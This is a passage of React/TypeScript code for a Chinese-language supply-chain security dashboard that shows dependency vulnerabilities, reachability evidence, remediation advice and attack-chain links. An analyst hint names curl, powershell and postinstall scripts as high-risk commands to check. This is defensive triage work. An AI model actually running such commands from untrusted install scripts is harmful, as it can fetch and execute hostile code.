              <div className='grid gap-2 text-sm'>
                <DetailRow label='当前版本' value={item?.currentVersion || '-'} />
                <DetailRow label='请求版本' value={item?.requestedVersion || '-'} />
                <DetailRow label='生态' value={item?.packageManager || '-'} />
                <DetailRow label='来源' value={<DependencySourceValue sources={item?.sourceFiles ?? []} />} />
                <DetailRow label='许可证' value={item?.dependency.license || '未知'} />
              </div>
              {item ? <ReachabilityGnnEvidence dependency={item.dependency} /> : null}
            </TabsContent>

            <TabsContent value='vulnerabilities' className='mt-0 space-y-2'>
              {(item?.dependency.vulnerabilities ?? []).length ? item?.dependency.vulnerabilities?.map((vulnerability) => (
                <div key={vulnerability.id} className='rounded-md border border-border bg-[color:var(--surface-inset)] p-3'>
                  <div className='flex flex-wrap items-center justify-between gap-2'>
                    <span className='font-mono text-sm font-semibold text-foreground'>{vulnerability.id}</span>
                    <ReachabilitySeverityBadge severity={normalizeSeverity(vulnerability.severity)} />
                  </div>
                  <p className='mt-2 text-sm leading-6 text-muted-foreground'>{vulnerability.summary || vulnerability.affected}</p>
                  <div className='mt-3 grid gap-2 text-xs'>
                    <div><span className='text-muted-foreground'>受影响版本：</span><span className='text-foreground'>{vulnerability.affected || '-'}</span></div>
                    <div><span className='text-muted-foreground'>安全版本：</span><span className='text-emerald-700 dark:text-emerald-300'>{vulnerability.fixed_versions?.join('、') || '尚无已知修复版本'}</span></div>
                  </div>
                </div>
              )) : (
                <ReachabilityEmptyState text='当前依赖没有已匹配的漏洞编号；仍需结合恶意包信号和证据缺口继续研判。' />
              )}
            </TabsContent>

            <TabsContent value='evidence' className='mt-0 space-y-2'>
              {([
                ['code', '代码引用', item?.evidence.codeRefs ?? 0],
                ['entry', '入口命中', item?.evidence.entryHits ?? 0],
                ['execution', '执行证据', item?.evidence.runtimeEvidence ?? 0],
                ['external', '外部告警', item?.evidence.externalAlerts ?? 0],
                ['graph', '攻击链关联', item?.evidence.attackChainLinks ?? 0],
              ] as Array<[ReachabilityEvidenceKind, string, number]>).map(([kind, label, value]) => (
                <button key={kind} type='button' onClick={() => openEvidenceDetail(kind)} className='flex w-full items-center justify-between rounded-md border border-border bg-[color:var(--surface-inset)] px-3 py-2.5 text-left transition-colors hover:border-cyan-300/35 hover:bg-cyan-400/10'>
                  <span className='text-sm font-medium text-foreground'>{label}</span>
                  <span className='flex items-center gap-2 text-sm tabular-nums text-muted-foreground'>{value} 条 <ChevronRight className='size-4' /></span>
                </button>
              ))}
              {(item?.rawEvidence.length ?? 0) > 0 ? (
                <div className='space-y-1.5 pt-2'>
                  <div className='text-xs font-semibold text-muted-foreground'>原始证据</div>
                  {item?.rawEvidence.slice(0, 4).map((evidence) => (
                    <div key={evidence} className='code-evidence block min-w-0 truncate px-2 py-1.5' title={evidence}>{evidence}</div>
                  ))}
                </div>
              ) : null}
            </TabsContent>

            <TabsContent value='remediation' className='mt-0 space-y-3'>
              <div className='rounded-md border border-cyan-300/25 bg-cyan-400/10 p-4'>
                <div className='flex items-center gap-2 text-sm font-semibold text-cyan-800 dark:text-cyan-100'>
                  <ShieldCheck className='size-4' />
                  建议处置
                </div>
                <p className='mt-2 text-sm leading-6 text-[color:var(--type-body)]'>{item?.dependency.recommendation || '优先确认依赖的安全版本、引入路径与真实调用证据，再决定升级或隔离。'}</p>
                {item && dependencySafeVersion(item) ? <p className='mt-3 text-sm font-medium text-emerald-700 dark:text-emerald-300'>建议升级至 {dependencySafeVersion(item)}</p> : null}
              </div>
              <div className='rounded-md border border-amber-300/30 bg-amber-400/10 p-3'>
                <div className='text-xs font-semibold text-amber-800 dark:text-amber-100'>仍需补充</div>
                <div className='mt-2 flex flex-wrap gap-1.5'>
                  {(item?.missing.length ? item.missing : ['当前证据完整']).map((gap) => (
                    <span key={gap} className='rounded-full border border-amber-300/35 px-2 py-0.5 text-xs text-amber-800 dark:text-amber-100'>{gap}</span>
                  ))}
                </div>
              </div>
              {item?.missing.includes('运行日志') ? (
                <Button variant='outline' className='w-full' onClick={() => jumpToPlatformTab('logs')}>
                  <Upload className='size-4' />
                  上传日志补充运行证据
                </Button>
              ) : null}
            </TabsContent>
          </div>
        </Tabs>
      </CardContent>
    </Card>
    <ReachabilityEvidenceDetailSheet
      workspace={workspace}
      item={item}
      kind={detailKind}
      open={Boolean(detailKind)}
      onOpenChange={(open) => {
        if (!open) setDetailKind(null)
      }}
    />
    </motion.div>
  )
}

function PathEvidenceCoverage({
  rows,
  activeEvidence,
  selectedId,
  onActiveEvidence,
  onSelectDependency,
  activeLabel,
}: {
  rows: ReachabilityMatrixRow[]
  activeEvidence: string
  selectedId: string
  onActiveEvidence: (id: string) => void
  onSelectDependency: (id: string) => void
  activeLabel: string
}) {
  const columns = [
    ['dependency', '依赖'],
    ['code', '代码'],
    ['entry', '入口'],
    ['execution', '执行'],
    ['external', '外部'],
    ['graph', '关联'],
  ]
  const visibleRows = rows
  const activeColumnIndex = Math.max(0, columns.findIndex(([id]) => id === activeEvidence))
  const evidenceGridClass = 'grid w-[252px] shrink-0 grid-cols-6 gap-2'

  return (
    <motion.div
      key={`coverage-${selectedId}-${activeEvidence}`}
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.2 }}
      className='rounded-md border border-border bg-[color:var(--surface-inset)] p-3'
    >
      <div className='mb-3 grid grid-cols-[minmax(0,1fr)_252px] items-center gap-3'>
        <div className='text-xs font-medium text-muted-foreground'>{activeLabel}</div>
        <div className={evidenceGridClass}>
          {columns.map(([id, label]) => (
            <button
              key={id}
              type='button'
              onClick={() => onActiveEvidence(id)}
              className={cn(
                'min-w-0 rounded-full border px-1 py-0.5 text-[11px] transition-[border-color,background-color,color,transform] hover:-translate-y-0.5',
                activeEvidence === id
                  ? 'border-cyan-300/40 bg-cyan-400/10 text-cyan-100'
                  : 'border-border bg-[color:var(--surface-inset)] text-muted-foreground hover:border-slate-300/25 hover:text-muted-foreground'
              )}
            >
              <span className='block truncate'>{label}</span>
            </button>
          ))}
        </div>
      </div>
      <div className='space-y-1.5'>
        {visibleRows.map((row) => (
          <button
            key={row.id}
            type='button'
            onClick={() => onSelectDependency(row.id)}
            className={cn(
              'grid w-full grid-cols-[minmax(0,1fr)_252px] items-center gap-3 rounded-md border border-slate-400/10 bg-[color:var(--surface-inset)] px-2.5 py-2 text-left transition-[border-color,background-color] hover:border-slate-300/25 hover:bg-[color:var(--surface-inset)]',
              row.id === selectedId && 'border-cyan-300/35 bg-cyan-400/10'
            )}
          >
            <div className='flex min-w-0 items-center gap-2' title={row.signal}>
              <span className='min-w-0 truncate text-xs font-medium text-muted-foreground'>
                {row.signal}
              </span>
              {row.severity ? <ReachabilitySeverityBadge severity={row.severity} /> : null}
            </div>
            <div className={evidenceGridClass}>
              {row.cells.map((cell, index) => (
                <span
                  key={`${row.id}-${index}`}
                  className='grid place-items-center'
                >
                  <span
                    title={cell.detail || cell.label}
                    onClick={(event) => {
                      event.stopPropagation()
                      onActiveEvidence(columns[index]?.[0] ?? 'dependency')
                      onSelectDependency(row.id)
                    }}
                    className={cn(
                      'size-2.5 rounded-full ring-4 transition-[box-shadow,transform]',
                      coverageDotClass(cell.status),
                      activeColumnIndex === index && 'scale-125 shadow-[0_0_14px_rgba(34,211,238,0.24)]'
                    )}
                  />
                </span>
              ))}
            </div>
          </button>
        ))}
      </div>
    </motion.div>
  )
}

const reachabilityEvidenceDetailMeta: Record<ReachabilityEvidenceKind, {
  title: string
  source: string
  target: string
  relation: string
  summary: string
  suggestions: string[]
}> = {
  code: {
    title: '代码引用',
    source: '可疑依赖',
    target: '项目源码',
    relation: 'import / require / call',
    summary: '用于确认依赖是否真的被当前项目源码、配置或扫描结果引用。',
    suggestions: ['核对 import/require 位置是否在生产路径中', '补充 SARIF、Semgrep 或代码扫描结果', '确认引用是否来自测试代码、示例代码或真实入口'],
  },
  entry: {
    title: '入口命中',
    source: '暴露入口',
    target: '可疑依赖',
    relation: '请求链 / 脚本入口',
    summary: '用于确认风险是否连接到 API、CLI、postinstall、workflow 或服务入口。',
    suggestions: ['补充路由、CLI、workflow 或 Dockerfile 入口材料', '确认入口是否可由外部请求或构建流程触发', '标记仅开发环境可达的入口，降低误报'],
  },
  execution: {
    title: '执行证据',
    source: '执行环境',
    target: '风险行为',
    relation: '脚本 / 配置 / 运行印证',
    summary: '用于判断可疑依赖或脚本是否可能在构建、安装或运行阶段执行。',
    suggestions: ['补充安装脚本、CI 日志或运行日志', '核查 postinstall、curl、powershell 等高风险命令', '确认扫描命中是否有真实执行上下文'],
  },
  external: {
    title: '外部告警',
    source: '告警材料',
    target: '供应链风险',
    relation: '实体 / 关键词关联',
    summary: '用于把截图、录音、文本告警中的包名、IP、路径和服务实体关联到当前依赖。',
    suggestions: ['补充包含包名、IP、接口或命令的告警截图', '确认 OCR/ASR 抽取实体是否与当前依赖一致', '把外部告警时间窗与构建、运行日志对齐'],
  },
  graph: {
    title: '攻击链关联',
    source: '可疑依赖',
    target: '攻击链地图',
    relation: '候选路径关联',
    summary: '用于确认当前依赖是否已经进入攻击链地图中的候选路径。',
    suggestions: ['打开攻击链地图复核上下游节点', '补齐路径中缺失的日志、产物或告警证据', '优先处理同时具备代码、执行和图谱印证的依赖'],
  },
}

function ReachabilityEvidenceDetailSheet({
  workspace,
  item,
  kind,
  open,
  onOpenChange,
}: {
  workspace: SecurityWorkspace
  item?: ReachabilityAnalysisItem
  kind: ReachabilityEvidenceKind | null
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const model = kind && item ? buildReachabilityEvidenceDetailModel(workspace, item, kind) : null

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent side='right' className='!w-full !max-w-[760px] overflow-hidden p-0 sm:!w-[58vw] sm:!max-w-[760px]'>
        {model ? (
          <>
            <SheetHeader className='border-b border-border px-6 py-5 text-start'>
              <SheetTitle className='text-xl font-bold tracking-tight'>{model.title}</SheetTitle>
              <SheetDescription className='sr-only'>{model.summary}</SheetDescription>
              <div className='mt-4 flex flex-wrap items-center gap-2'>
                <span className='rounded-full border border-border bg-[color:var(--surface-inset)] px-3 py-1 text-sm font-bold tabular-nums text-foreground'>
                  {formatPercent(model.confidence)} 置信度
                </span>
                <span className='text-sm text-muted-foreground'>{model.count} 条证据</span>
              </div>
            </SheetHeader>

            <div className='min-h-0 flex-1 overflow-y-auto px-6 py-6 [scrollbar-width:thin]'>
              <Tabs defaultValue='overview' className='w-full'>
                <TabsList className='mb-6'>
                  <TabsTrigger value='overview'>概览</TabsTrigger>
                  <TabsTrigger value='evidence'>证据</TabsTrigger>
                  <TabsTrigger value='context'>上下游</TabsTrigger>
                  <TabsTrigger value='advice'>建议</TabsTrigger>
                </TabsList>

                <TabsContent value='overview' className='mt-0'>
                  <div className='grid gap-4 md:grid-cols-2'>
                    <ReachabilityEvidenceField label='来源' value={model.source} />
                    <ReachabilityEvidenceField label='目标' value={model.target} />
                    <ReachabilityEvidenceField label='关系' value={model.relation} />
                    <ReachabilityEvidenceField label='置信度' value={formatPercent(model.confidence)} />
                  </div>
                  <div className='mt-4 rounded-md border border-border bg-[color:var(--surface-inset)] p-4 text-sm leading-6 text-muted-foreground'>
                    {model.summary}
                  </div>
                </TabsContent>

                <TabsContent value='evidence' className='mt-0 space-y-2'>
                  {model.evidence.length ? (
                    model.evidence.map((evidence, index) => (
                      <ReachabilityEvidenceLine key={`${model.kind}-evidence-${index}-${evidence}`} value={evidence} />
                    ))
                  ) : (
                    <ReachabilityEmptyState text='当前还没有结构化证据，可通过补充文件、代码扫描或攻击链地图继续补齐。' />
                  )}
                </TabsContent>

                <TabsContent value='context' className='mt-0 grid gap-4 md:grid-cols-2'>
                  <ReachabilityDrawerEvidenceList title='上游' items={model.upstream} />
                  <ReachabilityDrawerEvidenceList title='下游' items={model.downstream} />
                </TabsContent>

                <TabsContent value='advice' className='mt-0 space-y-2'>
                  {model.suggestions.map((suggestion) => (
                    <ReachabilityEvidenceLine key={suggestion} value={suggestion} />
                  ))}
                </TabsContent>
              </Tabs>
            </div>
          </>
        ) : (
          <>
            <SheetHeader className='border-b border-border px-6 py-5 text-start'>
              <SheetTitle className='text-xl font-bold tracking-tight'>证据详情</SheetTitle>
              <SheetDescription>请先选择一个依赖和证据类型。</SheetDescription>
            </SheetHeader>
            <div className='p-6'>
              <ReachabilityEmptyState text='暂无可展示的证据详情。' />
            </div>
          </>
        )}
      </SheetContent>
    </Sheet>
  )
}

function ReachabilityEvidenceField({ label, value }: { label: string; value: string }) {
  return (
    <div className='min-w-0 rounded-md border border-border bg-[color:var(--surface-inset)] px-4 py-3'>
      <div className='text-xs text-muted-foreground'>{label}</div>
      <div className='mt-2 break-words text-base font-bold text-foreground'>{value || '-'}</div>
    </div>
  )
}

function ReachabilityEvidenceLine({ value }: { value: string }) {
  return (
    <div className='rounded-md border border-border bg-[color:var(--surface-inset)] px-3 py-2 text-sm leading-6 text-[color:var(--type-body)]'>
      {value}
    </div>
  )
}

function ReachabilityDrawerEvidenceList({ title, items }: { title: string; items: string[] }) {
  return (
    <div className='rounded-md border border-border bg-[color:var(--surface-inset)] p-4'>
      <div className='text-sm font-bold text-foreground'>{title}</div>
      <div className='mt-3 space-y-2'>
        {items.length ? items.map((item) => <ReachabilityEvidenceLine key={`${title}-${item}`} value={item} />) : <ReachabilityEmptyState text='暂无上下游材料。' />}
      </div>
    </div>
  )
}

function ReachabilityEmptyState({ text }: { text: string }) {
  return (
    <div className='rounded-md border border-dashed border-border bg-[color:var(--surface-inset)] px-3 py-6 text-center text-sm text-muted-foreground'>
      {text}
    </div>
  )
}

function buildReachabilityEvidenceDetailModel(
  workspace: SecurityWorkspace,
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind
) {
  const meta = reachabilityEvidenceDetailMeta[kind]
  const dependencyLabel = `${item.name}@${item.currentVersion || '-'}`
  const relatedPaths = relatedAttackPathsForDependency(workspace, item.dependency)
  const evidence = evidenceRowsForReachabilityKind(workspace, item, kind, relatedPaths)
  const count = reachabilityEvidenceCount(item, kind)
  const confidence = reachabilityEvidenceConfidence(item, kind, count, relatedPaths)

  return {
    kind,
    title: meta.title,
    count,
    confidence,
    source: reachabilityEvidenceSource(item, kind, meta.source, dependencyLabel),
    target: reachabilityEvidenceTarget(kind, meta.target, dependencyLabel),
    relation: meta.relation,
    summary: reachabilityEvidenceSummary(item, kind, meta.summary, count),
    evidence,
    upstream: reachabilityEvidenceUpstream(item, kind, relatedPaths),
    downstream: reachabilityEvidenceDownstream(workspace, item, kind, relatedPaths),
    suggestions: meta.suggestions,
  }
}

function reachabilityEvidenceCount(item: ReachabilityAnalysisItem, kind: ReachabilityEvidenceKind) {
  if (kind === 'code') return item.evidence.codeRefs
  if (kind === 'entry') return item.evidence.entryHits
  if (kind === 'execution') return item.evidence.runtimeEvidence
  if (kind === 'external') return item.evidence.externalAlerts
  return item.evidence.attackChainLinks
}

function reachabilityEvidenceConfidence(
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  count: number,
  relatedPaths: KnowledgeGraphAttackPath[]
) {
  if (kind === 'graph' && relatedPaths.length) {
    return normalizeConfidence(Math.max(...relatedPaths.map((path) => path.confidence ?? 0)))
  }
  const reachabilityConfidence = item.dependency.reachability?.confidence
  if (typeof reachabilityConfidence === 'number' && count > 0) return normalizeConfidence(reachabilityConfidence)
  if (count > 0 && kind === 'external') return 0.7
  if (count > 0 && kind === 'execution') return 0.78
  if (count > 0) return 0.82
  return 0.35
}

function normalizeConfidence(value: number) {
  if (!Number.isFinite(value)) return 0
  return Math.max(0, Math.min(1, value > 1 ? value / 100 : value))
}

function reachabilityEvidenceSource(
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  fallback: string,
  dependencyLabel: string
) {
  if (kind === 'external') return '外部告警材料'
  if (kind === 'entry') return item.sourceFiles.map(compactDependencySource).join(' / ') || fallback
  if (kind === 'execution') return '构建 / 安装 / 运行环境'
  return kind === 'graph' ? dependencyLabel : fallback
}

function reachabilityEvidenceTarget(kind: ReachabilityEvidenceKind, fallback: string, dependencyLabel: string) {
  if (kind === 'code' || kind === 'entry') return dependencyLabel
  if (kind === 'external') return dependencyLabel
  if (kind === 'graph') return fallback
  return '风险执行路径'
}

function reachabilityEvidenceSummary(
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  fallback: string,
  count: number
) {
  const dependencyLabel = `${item.name}@${item.currentVersion || '-'}`
  if (count > 0) return `${dependencyLabel} 在「${reachabilityEvidenceDetailMeta[kind].title}」中已有 ${count} 条证据，建议打开证据和上下游标签复核来源。`
  return `${dependencyLabel} 暂未形成「${reachabilityEvidenceDetailMeta[kind].title}」证据。${fallback}`
}

function evidenceRowsForReachabilityKind(
  workspace: SecurityWorkspace,
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  relatedPaths: KnowledgeGraphAttackPath[]
) {
  const reachability = item.dependency.reachability
  if (kind === 'code') {
    return uniqueReachabilityEvidenceRows([
      ...(reachability?.code_evidence ?? []).map(formatReachabilityEvidence),
      ...(reachability?.call_evidence ?? []).map(formatReachabilityEvidence),
      ...item.rawEvidence,
    ])
  }
  if (kind === 'entry') {
    return uniqueReachabilityEvidenceRows((reachability?.attack_surface_evidence ?? []).map(formatReachabilityEvidence))
  }
  if (kind === 'execution') {
    return uniqueReachabilityEvidenceRows([
      ...(reachability?.call_evidence ?? []).map(formatReachabilityEvidence),
      ...(reachability?.runtime_evidence ?? []).map(formatReachabilityEvidence),
      ...item.rawEvidence.filter((evidence) => /postinstall|script|workflow|docker|runner|exec|call|runtime|运行|执行/i.test(evidence)),
    ])
  }
  if (kind === 'external') {
    return externalAlertEvidenceRows(workspace, item.dependency)
  }
  const pathEvidence = relatedPaths.flatMap((path, index) => [
    `${index + 1}. ${path.title || '候选攻击链'} · 置信度 ${formatPercent(normalizeConfidence(path.confidence ?? 0))}`,
    path.conclusion || path.description || '',
    ...(path.evidence_summary ?? []).slice(0, 3).map((evidence) => [evidence.title, evidence.detail, evidence.source].filter(Boolean).join(' · ')),
  ])
  return uniqueReachabilityEvidenceRows(pathEvidence)
}

function externalAlertEvidenceRows(workspace: SecurityWorkspace, dependency: SecurityDependency) {
  const auditEvidence = workspace.multimodal_audit?.evidence ?? []
  if (!auditEvidence.length) return []

  const tokens = dependencySearchTokens(dependency)
  const related = auditEvidence.filter((evidence) => {
    const text = JSON.stringify(evidence).toLowerCase()
    return tokens.some((token) => text.includes(token))
  })
  const selected = related.length ? related : auditEvidence
  const rows = selected.flatMap((evidence) => [
    `${evidence.original_filename || evidence.filename} · ${severityLabel(evidence.risk_level)} · 风险 ${evidence.risk_score}`,
    ...evidence.findings.slice(0, 2).map((finding) => `${finding.title} · ${finding.source_name} · ${finding.evidence}`),
    ...evidence.entities.slice(0, 3).map((entity) => `${entity.type}: ${entity.value} · ${entity.evidence}`),
  ])
  return uniqueReachabilityEvidenceRows(rows).slice(0, 10)
}

function relatedAttackPathsForDependency(workspace: SecurityWorkspace, dependency: SecurityDependency) {
  const tokens = dependencySearchTokens(dependency)
  return (workspace.graph?.attack_paths ?? []).filter((path) => {
    const text = attackPathSearchText(path)
    return tokens.some((token) => text.includes(token))
  })
}

function reachabilityEvidenceUpstream(
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  relatedPaths: KnowledgeGraphAttackPath[]
) {
  if (kind === 'graph') {
    return uniqueReachabilityEvidenceRows(relatedPaths.flatMap((path) => path.path_steps?.map((step) => step.source || '') ?? []))
  }
  return uniqueReachabilityEvidenceRows([
    `${item.packageManager} ${item.currentVersion || '-'}`,
    ...item.sourceFiles.map(compactDependencySource),
    ...(item.dependency.signals ?? []),
  ])
}

function reachabilityEvidenceDownstream(
  workspace: SecurityWorkspace,
  item: ReachabilityAnalysisItem,
  kind: ReachabilityEvidenceKind,
  relatedPaths: KnowledgeGraphAttackPath[]
) {
  if (kind === 'external') {
    return externalAlertEvidenceRows(workspace, item.dependency).slice(0, 4)
  }
  if (kind === 'graph') {
    return uniqueReachabilityEvidenceRows(relatedPaths.flatMap((path) => path.path_steps?.map((step) => step.target || '') ?? []))
  }
  return uniqueReachabilityEvidenceRows([
    ...(item.dependency.reachability?.attack_surface_evidence ?? []).map(formatReachabilityEvidence),
    ...(item.dependency.reachability?.runtime_evidence ?? []).map(formatReachabilityEvidence),
    ...(item.rawEvidence ?? []),
  ]).slice(0, 6)
}

function uniqueReachabilityEvidenceRows(values: string[]) {
  return Array.from(new Set(values.map((value) => value.trim()).filter(Boolean)))
}

function ReachabilitySeverityBadge({ severity }: { severity: SecuritySeverity }) {
  return (
    <span className={cn(
      'inline-flex h-5 shrink-0 items-center rounded-full border px-2 text-[11px] font-bold leading-none',
      severityClasses[severity]
    )}>
      {severityLabel(severity)}
    </span>
  )
}

function DetailRow({
  label,
  value,
  onClick,
  actionLabel,
}: {
  label: string
  value: ReactNode
  onClick?: () => void
  actionLabel?: string
}) {
  const isTextValue = typeof value === 'string' || typeof value === 'number'
  const className = cn(
    'grid min-w-0 grid-cols-[88px_minmax(0,1fr)] items-center gap-3 rounded-md border border-border bg-[color:var(--surface-inset)] px-3 py-2',
    onClick && 'text-left transition-[border-color,background-color,transform] hover:-translate-y-0.5 hover:border-cyan-300/30 hover:bg-cyan-400/10 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-cyan-300/40'
  )
  const content = (
    <>
      <span className='whitespace-nowrap text-label text-muted-foreground'>{label}</span>
      <div className='min-w-0 overflow-hidden text-right font-medium text-[color:var(--type-body)]' title={isTextValue ? String(value) : undefined}>
        {isTextValue ? <span className='block truncate'>{value}</span> : value}
      </div>
    </>
  )

  if (onClick) {
    return (
      <button type='button' className={className} onClick={onClick} aria-label={actionLabel || `查看${label}详情`}>
        {content}
      </button>
    )
  }

  return (
    <div className={className}>
      {content}
    </div>
  )
}

function DependencySourceValue({ sources }: { sources: string[] }) {
  if (!sources.length) return <span>-</span>

  const fullValue = sources.join(' / ')
  const visibleSources = sources.slice(0, 2).map(compactDependencySource)
  const displayValue = `${visibleSources.join(' · ')}${sources.length > 2 ? ` +${sources.length - 2}` : ''}`

  return <PathValue value={fullValue} display={displayValue} />
}

function PathValue({ value, display = truncateMiddle(value, 48) }: { value: string; display?: string }) {
  return (
    <span className='code-evidence max-w-full min-w-0 px-2 py-1 text-right' title={value}>
      <span className='truncate'>{display}</span>
    </span>
  )
}

function compactDependencySource(source: string) {
  const [location, ...kindParts] = source.split(';')
  const sourceSegments = location.trim().split(' / ').filter(Boolean)
  const path = sourceSegments[sourceSegments.length - 1] ?? location.trim()
  const kind = kindParts.join(';').trim()
  return [compactWorkflowPath(path), kind].filter(Boolean).join(' · ')
}

function SeverityPill({ severity }: { severity: SecuritySeverity }) {
  const classes = {
    critical: 'border-red-400/35 bg-red-500/10 text-red-700 dark:text-red-200',
    high: 'border-orange-400/35 bg-orange-500/10 text-orange-700 dark:text-orange-200',
    medium: 'border-amber-400/35 bg-amber-500/10 text-amber-700 dark:text-amber-200',
    low: 'border-cyan-400/30 bg-cyan-500/10 text-cyan-700 dark:text-cyan-200',
  }[severity]
  return (
    <span className={cn('inline-flex h-[26px] min-w-[44px] shrink-0 items-center justify-center whitespace-nowrap rounded-full border px-[10px] text-[13px] font-bold leading-none', classes)}>
      {severityLabel(severity)}
    </span>
  )
}

const reachabilityStatusOrder: ReachabilityStatus[] = ['reachable', 'pending']
const severityOrder: SecuritySeverity[] = ['critical', 'high', 'medium', 'low']

function normalizeReachabilityStatus(raw: unknown): ReachabilityStatus {
  const value = String(raw ?? '').trim().toLowerCase()
  if (['reachable', 'confirmed', '已可达'].includes(value)) return 'reachable'
  return 'pending'
}

function normalizeSeverity(raw: unknown): SecuritySeverity {
  const value = String(raw ?? '').trim().toLowerCase()
  if (['critical', 'serious', '严重'].includes(value)) return 'critical'
  if (['high', '高危'].includes(value)) return 'high'
  if (['medium', '中危'].includes(value)) return 'medium'
  return 'low'
}

function reachabilityStatusLabel(state: ReachabilityStatus) {
  if (state === 'reachable') return '已可达'
  return '待研判'
}

function reachabilityStatusClass(state: ReachabilityStatus) {
  if (state === 'reachable') return 'border-emerald-400/35 bg-emerald-500/10 text-emerald-200'
  return 'border-amber-400/35 bg-amber-500/10 text-amber-200'
}

function ReachabilityStatePill({ state }: { state: ReachabilityStatus }) {
  return (
    <span className={cn('inline-flex h-[26px] min-w-[44px] shrink-0 items-center justify-center whitespace-nowrap rounded-full border px-2.5 text-[13px] font-bold leading-none', reachabilityStatusClass(state))}>
      {reachabilityStatusLabel(state)}
    </span>
  )
}

function reachabilityNodeTone(tone: 'hit' | 'risk' | 'gap') {
  if (tone === 'risk') return 'border-red-300/35 bg-red-500/10 text-red-100 shadow-[0_0_18px_rgba(248,113,113,0.14)]'
  if (tone === 'gap') return 'border-amber-300/35 bg-amber-500/10 text-amber-100 shadow-[0_0_18px_rgba(251,191,36,0.12)]'
  return 'border-cyan-300/35 bg-cyan-500/10 text-cyan-100 shadow-[0_0_18px_rgba(34,211,238,0.12)]'
}

function coverageDotClass(status: ReachabilityMatrixCell['status']) {
  if (status === 'hit') return 'bg-emerald-300 ring-emerald-400/10'
  if (status === 'risk') return 'bg-red-300 ring-red-400/10'
  if (status === 'gap') return 'bg-amber-300 ring-amber-400/10'
  return 'bg-slate-600 ring-slate-500/10'
}

function riskGaugeTone(severity: SecuritySeverity) {
  if (severity === 'critical') {
    return {
      glow: 'bg-red-500/10',
      pulse: 'bg-red-500/15',
      stroke: 'stroke-red-400',
      text: 'text-red-100',
    }
  }
  if (severity === 'high') {
    return {
      glow: 'bg-orange-500/10',
      pulse: 'bg-orange-500/15',
      stroke: 'stroke-orange-400',
      text: 'text-orange-100',
    }
  }
  if (severity === 'medium') {
    return {
      glow: 'bg-amber-500/10',
      pulse: 'bg-amber-500/15',
      stroke: 'stroke-amber-400',
      text: 'text-amber-100',
    }
  }
  return {
    glow: 'bg-emerald-500/10',
    pulse: 'bg-emerald-500/15',
    stroke: 'stroke-emerald-400',
    text: 'text-emerald-100',
  }
}

function dependencyReachabilityState(dependency: SecurityDependency): ReachabilityStatus {
  const reachability = dependency.reachability
  const rawStatus =
    (reachability as Record<string, unknown> | undefined)?.status ??
    (reachability as Record<string, unknown> | undefined)?.reachabilityStatus ??
    (reachability as Record<string, unknown> | undefined)?.triageStatus
  if (rawStatus) return normalizeReachabilityStatus(rawStatus)
  const codeEvidence =
    Boolean(reachability?.imported) ||
    Boolean(reachability?.called) ||
    Boolean(reachability?.attack_surface) ||
    (reachability?.code_evidence?.length ?? 0) > 0 ||
    (reachability?.call_evidence?.length ?? 0) > 0 ||
    (reachability?.attack_surface_evidence?.length ?? 0) > 0
  return codeEvidence ? 'reachable' : 'pending'
}

function dependencyEvidenceCounts(dependency: SecurityDependency, codeFindings: CodeAuditFinding[]) {
  const reachability = dependency.reachability
  const tokens = dependencySearchTokens(dependency)
  const matchedCodeFindings = codeFindings.filter((finding) => {
    const text = `${finding.title} ${finding.risk_file} ${finding.evidence} ${finding.category}`.toLowerCase()
    return tokens.some((token) => text.includes(token))
  })
  return {
    code: (reachability?.code_evidence?.length ?? 0) + (reachability?.call_evidence?.length ?? 0) + matchedCodeFindings.length,
    entry: Number(Boolean(reachability?.attack_surface)) + (reachability?.attack_surface_evidence?.length ?? 0),
    execution: Number(Boolean(reachability?.called)) + (reachability?.call_evidence?.length ?? 0),
    runtime: Number(Boolean(reachability?.runtime_trace)) + (reachability?.runtime_evidence?.length ?? 0),
  }
}

function dependencySources(dependency: SecurityDependency) {
  return Array.from(new Set([
    dependency.source_file,
    dependency.manifest_type,
  ].filter(Boolean) as string[]))
}

function buildReachabilityItems(
  dependencies: SecurityDependency[],
  codeFindings: CodeAuditFinding[],
  model: ReachabilityViewModel,
  externalEvidenceCount: number
): ReachabilityAnalysisItem[] {
  const graphHits = model.graphHits
  return dependencies.map((dependency) => {
    const counts = dependencyEvidenceCounts(dependency, codeFindings)
    const status = dependencyReachabilityState(dependency)
    const missing = [
      counts.code <= 0 ? '代码引用' : '',
      counts.entry <= 0 ? '入口证据' : '',
      counts.execution + counts.runtime <= 0 ? '运行日志' : '',
    ].filter(Boolean)
    const rawEvidence = [
      ...(dependency.reachability?.code_evidence ?? []),
      ...(dependency.reachability?.call_evidence ?? []),
      ...(dependency.reachability?.attack_surface_evidence ?? []),
      ...(dependency.reachability?.runtime_evidence ?? []),
      ...codeFindings
        .filter((finding) => {
          const text = `${finding.title} ${finding.risk_file} ${finding.evidence} ${finding.category}`.toLowerCase()
          return dependencySearchTokens(dependency).some((token) => text.includes(token))
        })
        .map((finding) => `${finding.risk_file}:${finding.line} ${finding.category}`),
    ].filter(Boolean).map(formatReachabilityEvidence)

    return {
      id: dependencyKey(dependency),
      dependency,
      name: dependency.name,
      currentVersion: dependency.version || '',
      requestedVersion: dependency.requested_version || '',
      packageManager: dependency.ecosystem || 'npm',
      sourceFiles: dependencySources(dependency),
      severity: dependencySeverity(dependency.risk),
      riskScore: dependency.risk ?? 0,
      status,
      evidence: {
        codeRefs: counts.code,
        entryHits: counts.entry,
        runtimeEvidence: counts.execution + counts.runtime,
        externalAlerts: externalEvidenceCount,
        attackChainLinks: status === 'reachable' ? graphHits : 0,
      },
      missing,
      advisories: dependency.vulnerabilities?.map((item) => item.id).filter(Boolean) ?? [],
      rawEvidence,
    }
  })
}

function formatReachabilityEvidence(evidence: unknown): string {
  if (typeof evidence === 'string') return evidence
  if (evidence && typeof evidence === 'object') {
    const record = evidence as Record<string, unknown>
    const file = [record.file, record.path, record.source, record.event].find((value) => typeof value === 'string')
